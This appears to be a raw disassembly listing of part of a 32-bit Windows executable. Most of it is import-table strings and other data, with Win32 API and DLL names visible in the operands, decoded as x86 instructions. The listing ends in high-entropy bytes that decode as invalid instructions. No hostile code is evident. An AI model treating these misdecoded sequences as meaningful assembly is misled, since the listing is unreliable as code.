  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
  41e8f1:	add    BYTE PTR [edi+0x65],al
  41e8f4:	je     0x41e939
  41e8f6:	popa   
  41e8f7:	jb     0x41e95e
  41e8f9:	je     0x41e94b
  41e8fb:	outs   dx,DWORD PTR ds:[esi]
  41e8fc:	jae    0x41e8fe
  41e8fe:	jnp    0x41e902
  41e900:	push   ebx
  41e901:	push   0x7543776f
  41e906:	jb     0x41e97b
  41e908:	outs   dx,DWORD PTR ds:[esi]
  41e909:	jb     0x41e90b
  41e90b:	add    BYTE PTR [eax+0x1],bl
  41e90e:	inc    edi
  41e90f:	gs je  0x41e965
  41e912:	jne    0x41e976
  41e914:	dec    ebp
  41e915:	outs   dx,BYTE PTR gs:[esi]
  41e917:	jne    0x41e919
  41e919:	add    cl,al
  41e91b:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  41e91f:	imul   esi,DWORD PTR [ebp+0x70],0x49
  41e923:	arpl   WORD PTR [edi+0x6e],bp
  41e926:	dec    ecx
  41e927:	fs inc esi
  41e929:	jb     0x41e99a
  41e92b:	ins    DWORD PTR es:[edi],dx
  41e92c:	inc    esp
  41e92d:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41e934:	jns    0x41e936
  41e936:	push   ebp
  41e937:	push   ebx
  41e938:	inc    ebp
  41e939:	push   edx
  41e93a:	xor    esi,DWORD PTR [edx]
  41e93c:	cs fs ins BYTE PTR es:[edi],dx
  41e93f:	ins    BYTE PTR es:[edi],dx
  41e940:	add    BYTE PTR [eax],al
  41e942:	push   ebx
  41e943:	dec    eax
  41e944:	inc    ebp
  41e945:	dec    esp
  41e946:	dec    esp
  41e947:	xor    esi,DWORD PTR [edx]
  41e949:	cs fs ins BYTE PTR es:[edi],dx
  41e94c:	ins    BYTE PTR es:[edi],dx
  41e94d:	add    BYTE PTR [ebx+0x70],dh
  41e950:	push   ecx
  41e951:	dec    edx
  41e952:	push   0x47
  41e954:	jne    0x41e99c
  41e956:	jns    0x41e99f
  41e958:	push   edi
  41e959:	push   esi
  41e95a:	inc    edi
  41e95b:	ins    BYTE PTR es:[edi],dx
  41e95c:	inc    ecx
  41e95d:	inc    edi
  41e95e:	push   ds
  41e95f:	in     eax,dx
  41e960:	inc    ecx
  41e961:	add    BYTE PTR [esi],ah
  41e963:	in     eax,dx
  41e964:	inc    ecx
  41e965:	add    BYTE PTR [esi-0x10ffbe15],ah
  41e96b:	or     esi,DWORD PTR [edx+0x324f7d0e]
  41e971:	dec    edi
  41e972:	addr16 dec edi
  41e974:	xor    DWORD PTR [edi+0x4f],ecx
  41e977:	dec    edi
  41e978:	cmp    al,0x4f
  41e97a:	jp     0x41e9cb
  41e97c:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e97f:	dec    edi
  41e980:	es dec edi
  41e982:	jae    0x41e9d3
  41e984:	and    eax,0x224f324f
  41e989:	dec    edi
  41e98a:	push   ds
  41e98b:	push   edx
  41e98c:	pop    ds
  41e98d:	push   ebx
  41e98e:	cmp    eax,0x324f7d4f
  41e993:	dec    edi
  41e994:	addr16 dec edi
  41e996:	xor    DWORD PTR [edi+0x4f],ecx
  41e999:	dec    edi
  41e99a:	cmp    al,0x4f
  41e99c:	jp     0x41e9ed
  41e99e:	cmp    ecx,DWORD PTR [edi+0x5e]
  41e9a1:	dec    edi
  41e9a2:	es dec edi
  41e9a4:	ins    DWORD PTR es:[edi],dx
  41e9a5:	dec    edi
  41e9a6:	and    eax,0x224f324f
  41e9ab:	dec    edi
  41e9ac:	push   ds
  41e9ad:	bound  ebx,QWORD PTR [edi]
  41e9af:	arpl   WORD PTR ds:0x324f7d4f,di
  41e9b5:	dec    edi
  41e9b6:	bound  ecx,QWORD PTR [edi+0x31]
  41e9b9:	dec    edi
  41e9ba:	jae    0x41ea0b
  41e9bc:	cmp    eax,0x384f404f
  41e9c1:	dec    edi
  41e9c2:	xor    cl,BYTE PTR [edi+0x24]
  41e9c5:	dec    edi
  41e9c6:	push   ds
  41e9c7:	jb     0x41e9e8
  41e9c9:	jae    0x41e9da
  41e9cb:	or     DWORD PTR [eax+eax*4],0x7c
  41e9cf:	nop
  41e9d0:	jge    0x41e963
  41e9d2:	aas    
  41e9d3:	dec    edi
  41e9d4:	dec    di
  41e9d6:	xor    cl,BYTE PTR [edi+0x66]
  41e9d9:	dec    edi
  41e9da:	ds dec edi
  41e9dc:	inc    eax
  41e9dd:	dec    edi
  41e9de:	cmp    eax,0x394f734f
  41e9e3:	dec    edi
  41e9e4:	xor    cl,BYTE PTR [edi+0x26]
  41e9e7:	dec    edi
  41e9e8:	push   ds
  41e9e9:	sbb    BYTE PTR [edi],0x83
  41e9ec:	setae  BYTE PTR [eax+edx*4]
  41e9f0:	jl     0x41e992
  41e9f2:	jge    0x41e995
  41e9f4:	aas    
  41e9f5:	dec    edi
  41e9f6:	dec    di
  41e9f8:	xor    cl,BYTE PTR [edi+0x66]
  41e9fb:	dec    edi
  41e9fc:	ds dec edi
  41e9fe:	inc    eax
  41e9ff:	dec    edi
  41ea00:	cmp    eax,0x394f6d4f
  41ea05:	dec    edi
  41ea06:	xor    cl,BYTE PTR [edi+0x26]
  41ea09:	dec    edi
  41ea0a:	push   ds
  41ea0b:	xchg   edx,eax
  41ea0c:	pop    ds
  41ea0d:	xchg   ebx,eax
  41ea0e:	bt     DWORD PTR [eax+eiz*4],ecx
  41ea12:	jl     0x41e9c4
  41ea14:	jge    0x41e9c7
  41ea16:	aas    
  41ea17:	dec    edi
  41ea18:	ins    BYTE PTR es:[edi],dx
  41ea19:	dec    edi
  41ea1a:	xor    cl,BYTE PTR [edi+0x4e]
  41ea1d:	dec    edi
  41ea1e:	xor    DWORD PTR [edi+0x73],ecx
  41ea21:	dec    edi
  41ea22:	cmp    eax,0x384f454f
  41ea27:	dec    edi
  41ea28:	xor    cl,BYTE PTR [edi+0x26]
  41ea2b:	dec    edi
  41ea2c:	push   ds
  41ea2d:	mov    ds:0xb30fa31f,al
  41ea32:	or     al,0xb0
  41ea34:	jl     0x41e9f6
  41ea36:	jge    0x41e9f9
  41ea38:	aas    
  41ea39:	dec    edi
  41ea3a:	ins    BYTE PTR es:[edi],dx
  41ea3b:	dec    edi
  41ea3c:	xor    cl,BYTE PTR [edi+0x4e]
  41ea3f:	dec    edi
  41ea40:	xor    DWORD PTR [edi+0x7c],ecx
  41ea43:	dec    edi
  41ea44:	cmp    eax,0x3b4f5f4f
  41ea49:	dec    edi
  41ea4a:	xor    cl,BYTE PTR [edi+0x39]
  41ea4d:	dec    edi
  41ea4e:	push   ds
  41ea4f:	mov    dl,0x1f
  41ea51:	mov    bl,0xf
  41ea53:	ret    
  41ea54:	or     al,0xc0
  41ea56:	jl     0x41ea28
  41ea58:	jge    0x41ea2b
  41ea5a:	aas    
  41ea5b:	dec    edi
  41ea5c:	ins    BYTE PTR es:[edi],dx
  41ea5d:	dec    edi
  41ea5e:	xor    cl,BYTE PTR [edi+0x4e]
  41ea61:	dec    edi
  41ea62:	xor    DWORD PTR [edi+0x62],ecx
  41ea65:	dec    edi
  41ea66:	cmp    eax,0x384f4e4f
  41ea6b:	dec    edi
  41ea6c:	xor    cl,BYTE PTR [edi+0x24]
  41ea6f:	dec    edi
  41ea70:	push   ds
  41ea71:	ret    0xc31f
  41ea74:	psrlq  mm1,QWORD PTR [eax+edx*8]
  41ea78:	jl     0x41ea5a
  41ea7a:	jge    0x41ea5d
  41ea7c:	aas    
  41ea7d:	dec    edi
  41ea7e:	ins    BYTE PTR es:[edi],dx
  41ea7f:	dec    edi
  41ea80:	xor    cl,BYTE PTR [edi+0x4e]
  41ea83:	dec    edi
  41ea84:	xor    DWORD PTR [edi+0x63],ecx
  41ea87:	dec    edi
  41ea88:	cmp    eax,0x384f404f
  41ea8d:	dec    edi
  41ea8e:	xor    cl,BYTE PTR [edi+0x26]
  41ea91:	dec    edi
  41ea92:	push   ds
  41ea93:	rcr    BYTE PTR [edi],cl
  41ea95:	ror    DWORD PTR [edi],cl
  41ea97:	jecxz  0x41eaa5
  41ea99:	loopne 0x41eb17
  41ea9b:	lock jge 0x41ea8f
  41ea9e:	aas    
  41ea9f:	dec    edi
  41eaa0:	popa   
  41eaa1:	dec    edi
  41eaa2:	xor    cl,BYTE PTR [edi+0x5f]
  41eaa5:	dec    edi
  41eaa6:	xor    DWORD PTR [edi+0x42],ecx
  41eaa9:	dec    edi
  41eaaa:	ds dec edi
  41eaac:	xor    cl,BYTE PTR [edi+0x3f]
  41eaaf:	dec    edi
  41eab0:	push   ds
  41eab1:	loop   0x41ead2
  41eab3:	jecxz  0x41eac4
  41eab5:	repz or al,0xf0
  41eab8:	jl     0x41eaba
  41eaba:	jge    0x41eabd
  41eabc:	jl     0x41eace
  41eabe:	jge    0x41ead1
  41eac0:	ds dec edi
  41eac2:	jg     0x41eb13
  41eac4:	xor    cl,BYTE PTR [edi+0x5b]
  41eac7:	dec    edi
  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fst    QWORD PTR [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x846653c0
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [eax+0x10000006],cl
  41edc3:	xor    BYTE PTR ds:0x126ce729,dl
  41edc9:	pop    edi
  41edca:	mov    WORD PTR [edi-0xa],?
  41edcd:	and    dl,ah
  41edcf:	sar    DWORD PTR [edi-0x7b],cl
  41edd2:	les    ebx,FWORD PTR [edi-0x73]
  41edd5:	std    
  41edd6:	xchg   ebp,eax
  41edd7:	mov    eax,0x33e26225
  41eddc:	and    al,0x99
  41edde:	mov    ?,WORD PTR [edx-0x3]
  41ede1:	xor    ecx,DWORD PTR [eax]
  41ede3:	data16 rol BYTE PTR [ebx-0x717457db],1
  41edea:	bound  edi,QWORD PTR [ebx-0x1b]
  41eded:	mov    ebx,0xfe4f22d3
  41edf2:	xlat   BYTE PTR ds:[ebx]
  41edf3:	dec    esp
  41edf4:	jae    0x41ede6
  41edf6:	or     DWORD PTR ds:[edi-0x68],eax
  41edfa:	hlt    
  41edfb:	mov    esp,0x5c246fe4
  41ee00:	aam    0xa2
  41ee02:	fstp   QWORD PTR ds:0xa1b74b9
  41ee08:	out    dx,eax
  41ee09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee0a:	add    esi,edx
  41ee0c:	loope  0x41ee73
  41ee0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee0f:	pop    ss
  41ee10:	(bad)  
  41ee11:	jb     0x41ee8f
  41ee13:	mov    ds:0x1ffc1c81,al
  41ee18:	outs   dx,DWORD PTR ds:[esi]
  41ee19:	(bad)  
  41ee1a:	aad    0x93
  41ee1c:	push   esp
  41ee1d:	cmc    
  41ee1e:	push   0xb47ec4b7
  41ee23:	(bad)  
  41ee24:	jmp    0xe124:0x36a327f3
  41ee2b:	adc    al,0x90
  41ee2d:	adc    al,0xb6
  41ee2f:	mov    bh,0x98
  41ee31:	cmp    BYTE PTR [esi+edi*1],al
  41ee34:	xchg   esp,eax
  41ee35:	jg     0x41edb8
  41ee37:	lahf   
  41ee38:	jecxz  0x41ee8e
  41ee3a:	pop    esi
  41ee3b:	or     BYTE PTR [ebx-0x317a706b],ah
  41ee41:	ss in  eax,dx
  41ee43:	frstor [ecx+0x29437114]
  41ee49:	adc    DWORD PTR ds:0x8ba68113,eax
  41ee4f:	jg     0x41eeb3
  41ee51:	mov    cl,0x25
  41ee53:	mov    esp,0x3f430340
  41ee58:	cmp    al,0x19
  41ee5a:	mov    al,ds:0xfbb3f0f0
  41ee5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee60:	(bad)  
  41ee61:	or     BYTE PTR [ebx-0x7a],al
  41ee64:	lods   al,BYTE PTR ds:[esi]
  41ee65:	mov    cl,0xf3
  41ee67:	xchg   ebp,eax
  41ee68:	dec    edi
  41ee69:	xor    al,0x3e
  41ee6b:	jmp    0x8563:0x18a7224c
  41ee72:	pop    esp
  41ee73:	ds inc ecx
  41ee75:	sbb    BYTE PTR [ebx+0x56bceb91],bl
  41ee7b:	div    DWORD PTR [ebp-0x4fce7a97]
  41ee81:	mov    bh,0x49
  41ee83:	push   edi
  41ee84:	fadd   st,st(4)
  41ee86:	stos   BYTE PTR es:[edi],al
  41ee87:	stc    
  41ee88:	pop    eax
  41ee89:	(bad)  
  41ee8a:	aas    
  41ee8b:	pop    ss
  41ee8c:	xor    BYTE PTR [edi],bl
  41ee8e:	pop    es
  41ee8f:	cmp    al,0xd6
  41ee91:	pop    edx
  41ee92:	push   esi
  41ee93:	rol    DWORD PTR [edx-0x12],cl
  41ee96:	mov    WORD PTR [ebp-0x3d],cs
  41ee99:	or     eax,0x5a201b6e
  41ee9e:	xor    BYTE PTR [edi+0x47762013],0x1c
  41eea5:	dec    ebx
  41eea6:	push   esp
  41eea7:	push   edx
  41eea8:	mov    ebx,0xa4795735
  41eead:	cmp    bl,al
  41eeaf:	not    BYTE PTR [edi-0x2e]
  41eeb2:	rol    DWORD PTR [ebx-0x2a],0x97
  41eeb6:	xchg   esp,eax
  41eeb7:	lods   al,BYTE PTR ds:[esi]
  41eeb8:	aam    0x8b
  41eeba:	pop    edi
  41eebb:	cwde   
  41eebc:	jno    0x41ee79
  41eebe:	std    
  41eebf:	pop    DWORD PTR [eax+0x16]
  41eec2:	push   esi
  41eec3:	aaa    
  41eec4:	out    0xa8,al
  41eec6:	inc    edi
  41eec7:	xor    BYTE PTR [edx-0x75],al
  41eeca:	repz sub BYTE PTR [edx-0x3c],bl
  41eece:	push   0xac48cf80
  41eed3:	jmp    0x1156eead
  41eed8:	cmp    DWORD PTR [edx-0x68fad871],eax
  41eede:	mov    edx,0xa4027b19
  41eee3:	aam    0x5f
  41eee5:	xchg   ecx,eax
  41eee6:	jbe    0x41ee97
  41eee8:	ror    BYTE PTR [ebx+0x6b],0x22
  41eeec:	add    eax,ecx
  41eeee:	sbb    dh,0xd7
  41eef1:	xor    ebx,DWORD PTR [ecx+eax*4+0x24]
  41eef5:	fcom   DWORD PTR [esi]
  41eef7:	adc    BYTE PTR [esi-0x58],ch
  41eefa:	cs sub al,0xe2
  41eefd:	adc    DWORD PTR [esi],0x3c
  41ef00:	mov    edi,0x71889865
  41ef05:	in     eax,0x7d
  41ef07:	push   0x454125e2
  41ef0c:	ds cmp dh,0x80
  41ef10:	call   0xda255852
  41ef15:	pushf  
  41ef16:	daa    
  41ef17:	xor    al,0x59
  41ef19:	rcl    DWORD PTR [ebp-0x3506b607],cl
  41ef1f:	out    dx,eax
  41ef20:	mov    bh,0x5b
  41ef22:	fucom  st(2)
  41ef24:	adc    dl,dh
  41ef26:	(bad)  
  41ef27:	icebp  
  41ef28:	(bad)  
  41ef2a:	push   ebp
  41ef2b:	sub    BYTE PTR [eax],bh
  41ef2d:	fiadd  DWORD PTR [ebx-0x82ff03d]
  41ef33:	mov    ds:0xe7a028e4,al
  41ef38:	int    0xb5
  41ef3a:	cmp    cl,al
  41ef3c:	push   esi
  41ef3d:	mov    esi,fs
  41ef3f:	add    eax,0x74241d24
  41ef44:	inc    ecx
  41ef45:	add    al,0xb7
  41ef47:	clc    
  41ef48:	repnz retf 
  41ef4a:	mov    ds:0x8bc65e65,eax
  41ef4f:	data16 loop 0x41efc0
  41ef52:	adc    BYTE PTR [edi-0x6172370],bl
  41ef58:	and    al,0x8a
  41ef5a:	mov    al,0x2a
  41ef5c:	pushf  
  41ef5d:	pop    es
  41ef5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef5f:	mov    ebx,0xfecb4a2d
  41ef64:	call   0xfe4178af
  41ef69:	test   BYTE PTR [eax],bh
  41ef6b:	mov    dh,0x28
  41ef6d:	enter  0xacf2,0xd8
  41ef71:	push   esp
  41ef72:	popa   
  41ef73:	add    ecx,DWORD PTR [ecx-0x2c]
  41ef76:	push   ds
  41ef77:	mov    WORD PTR [ecx-0x362f8a14],?
  41ef7d:	pop    ds
  41ef7e:	xor    bl,BYTE PTR [esi+ebx*4]
  41ef81:	in     al,dx
  41ef82:	(bad)  
  41ef83:	mov    bl,0x1f
  41ef85:	out    0x9e,eax
